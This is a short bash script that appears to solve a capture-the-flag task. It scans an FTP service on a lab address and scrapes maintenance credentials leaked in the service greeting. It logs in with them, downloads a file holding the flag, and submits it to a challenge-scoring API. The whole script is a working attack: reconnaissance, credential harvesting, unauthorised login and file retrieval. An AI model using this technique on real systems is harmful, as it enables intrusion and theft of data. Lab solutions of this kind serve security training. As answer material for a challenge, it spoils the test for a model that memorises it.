#!/usr/bin/env bash
set -euo pipefail

TARGET=172.20.0.147
nmap -Pn -sV -p 21 "$TARGET" >/dev/null

flag=$(python3 - "$TARGET" <<'PY'
import ftplib
import re
import socket
import sys

host = sys.argv[1]
with socket.create_connection((host, 21), timeout=5) as sock:
    greeting = sock.makefile("rb").readline().decode("utf-8", "replace")
match = re.search(r"user=([A-Za-z0-9_]+)\s+pass=([A-Za-z0-9_-]+)", greeting)
if not match:
    raise SystemExit("Could not find maintenance credentials in the service greeting")
user, password = match.groups()
ftp = ftplib.FTP()
ftp.connect(host, 21, timeout=5)
ftp.login(user, password)
ftp.set_pasv(False)
parts = []
ftp.retrbinary("RETR recovery-record.txt", parts.append)
ftp.quit()
sys.stdout.write(b"".join(parts).decode("utf-8").strip())
PY
)

curl -s http://172.20.0.3/api/challenges/submit -X POST -H 'Content-Type: application/json' \
  --data-binary "{\"challenge_id\":\"scl-challenge-frame-35d3f8\",\"task_id\":\"task1\",\"flag\":\"${flag}\"}"
